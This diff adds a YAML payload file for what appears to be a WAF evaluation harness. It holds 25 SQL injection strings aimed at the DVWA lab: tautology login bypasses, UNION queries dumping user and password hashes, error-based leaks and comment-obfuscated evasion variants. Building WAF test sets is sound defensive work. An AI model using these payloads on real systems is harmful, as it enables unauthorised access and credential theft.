@@ -1,0 +1,196 @@
+# SQL injection payloads — 25 entries (prompt.md §6: SQLi ≥25).
+# Sources: PayloadsAllTheThings/SQL Injection, OWASP WSTG v4.2, SecLists.
+# Destructive payloads (DROP/TRUNCATE/etc) are rejected at load time.
+#
+# Trigger semantics (see wafeval.models.Trigger):
+#   - contains: baseline body must contain this substring
+#   - regex:    baseline body matches this pattern
+#   - reflected: baseline reflects the payload string
+#   - status:   baseline returns this exact HTTP status
+#
+# Target reference: most entries trigger on DVWA /vulnerabilities/sqli/ which
+# emits "First name: <value>" on a successful UNION/boolean exploit or a
+# MySQL error on a malformed one.
+
+# ---- boolean / tautology (5) ----
+- id: sqli-bool-001
+  class: sqli
+  payload: "1' OR '1'='1"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings/SQL Injection/Intruder/exploit.txt"
+
+- id: sqli-bool-002
+  class: sqli
+  payload: "1' OR 1=1 -- -"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "OWASP WSTG v4.2 §4.9.4"
+
+- id: sqli-bool-003
+  class: sqli
+  payload: "' OR 'a'='a"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "SecLists/Fuzzing/SQLi/Generic-SQLi.txt"
+
+- id: sqli-bool-004
+  class: sqli
+  payload: "1' OR 1=1#"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — MySQL comments"
+
+- id: sqli-bool-005
+  class: sqli
+  payload: "admin' OR 1=1 -- -"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "OWASP cheat-sheet: auth bypass"
+
+# ---- UNION-based (6) ----
+- id: sqli-union-001
+  class: sqli
+  payload: "1' UNION SELECT null, version() -- -"
+  trigger: { kind: regex, pattern: "First name|MariaDB|MySQL|[0-9]+\\.[0-9]+\\.[0-9]+" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings/SQL Injection/MySQL Injection.md"
+
+- id: sqli-union-002
+  class: sqli
+  payload: "' UNION SELECT user(), database() -- -"
+  trigger: { kind: regex, pattern: "First name|@localhost|dvwa" }
+  cwe: CWE-89
+  source: "OWASP cheat-sheet: MySQL info-gathering"
+
+- id: sqli-union-003
+  class: sqli
+  payload: "1' UNION SELECT user,password FROM users -- -"
+  trigger: { kind: regex, pattern: "First name|[a-f0-9]{32}" }
+  cwe: CWE-89
+  source: "DVWA walkthrough — classic UNION creds dump"
+
+- id: sqli-union-004
+  class: sqli
+  payload: "-1' UNION SELECT null,table_name FROM information_schema.tables -- -"
+  trigger: { kind: regex, pattern: "First name|users|information_schema" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — MySQL information_schema"
+
+- id: sqli-union-005
+  class: sqli
+  payload: "' UNION ALL SELECT 1,2,3 -- -"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "SecLists/Fuzzing/SQLi/Generic-SQLi.txt"
+
+- id: sqli-union-006
+  class: sqli
+  payload: "1' UNION SELECT schema_name,null FROM information_schema.schemata -- -"
+  trigger: { kind: regex, pattern: "First name|dvwa|information_schema" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — schema enumeration"
+
+# ---- stacked (2) ----
+- id: sqli-stacked-001
+  class: sqli
+  payload: "1'; SELECT SLEEP(0) -- -"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings/SQL Injection/Stacked Queries"
+  notes: "SLEEP(0) keeps the probe fast; stacked semicolon tests parser"
+
+- id: sqli-stacked-002
+  class: sqli
+  payload: "1'; SELECT IF(1=1,1,0) -- -"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — stacked conditional"
+
+# ---- time-based (3) ----
+- id: sqli-time-001
+  class: sqli
+  payload: "1' AND SLEEP(0) -- -"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings/SQL Injection/Time-based"
+
+- id: sqli-time-002
+  class: sqli
+  payload: "1' AND IF(1=1,SLEEP(0),0) -- -"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "OWASP WSTG v4.2 — conditional timing"
+
+- id: sqli-time-003
+  class: sqli
+  payload: "1' OR SLEEP(0) -- -"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — disjunctive timing"
+
+# ---- error-based (3) ----
+- id: sqli-error-001
+  class: sqli
+  payload: "1' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) -- -"
+  trigger: { kind: regex, pattern: "XPATH|syntax|First name" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — MySQL error-based"
+
+- id: sqli-error-002
+  class: sqli
+  payload: "1' AND UPDATEXML(1, CONCAT(0x7e, user()), 1) -- -"
+  trigger: { kind: regex, pattern: "XPATH|syntax|First name" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — UPDATEXML error leak"
+
+- id: sqli-error-003
+  class: sqli
+  payload: "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -"
+  trigger: { kind: regex, pattern: "duplicate|First name|syntax" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — double-query error"
+
+# ---- inline-comment obfuscation baselines (3) ----
+- id: sqli-inline-comment-001
+  class: sqli
+  payload: "1'/**/OR/**/'1'='1"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "OWASP CRS test-suite"
+
+- id: sqli-inline-comment-002
+  class: sqli
+  payload: "1'/*!50000UNION*/SELECT 1,2 -- -"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — MySQL versioned comment"
+
+- id: sqli-inline-comment-003
+  class: sqli
+  payload: "1' %0aOR%0a '1'='1"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "SecLists/Fuzzing/SQLi — newline splitting"
+
+# ---- second-order / auth-bypass variants (3) ----
+- id: sqli-auth-001
+  class: sqli
+  payload: "admin'-- -"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — auth-bypass shorthand"
+
+- id: sqli-auth-002
+  class: sqli
+  payload: "' OR '' = '"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "SecLists/Generic-SQLi"
+
+- id: sqli-auth-003
+  class: sqli
+  payload: "1' OR ASCII(SUBSTRING(user(),1,1))>0 -- -"
+  trigger: { kind: contains, needle: "First name" }
+  cwe: CWE-89
+  source: "PayloadsAllTheThings — blind-ASCII oracle"
